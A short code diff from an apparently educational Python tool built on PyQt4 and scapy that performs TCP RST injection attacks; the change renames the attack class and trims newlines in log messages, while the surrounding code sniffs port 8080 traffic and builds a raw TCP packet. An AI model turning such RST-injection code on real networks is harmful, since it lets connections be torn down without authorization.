@@ -2,7 +2,7 @@ from PyQt4.QtCore import QThread
 from scapy.all import *
 from injector_lib import getFlags
 
-class Attack_RST(QThread):
+class Attack(QThread):
     def __init__(self):
         QThread.__init__(self)
         self.textBox = None
@@ -28,9 +28,9 @@ class Attack_RST(QThread):
         sniffing  = sniff(iface = "virbr0", filter = "port 8080", count = 2)
         flags = str(getFlags(sniffing[1][TCP].flags))
         if 'RST' in flags:
-            self.log_textBox.appendText("\nRST attack successfull!\n")
+            self.log_textBox.appendText("RST attack successfull!\n")
         else:
-            self.log_textBox.appendText("\nRST attack failed.\n")
+            self.log_textBox.appendText("RST attack failed.\n")
 
     def attack(self):
         pacote = Ether()/IP()/TCP()
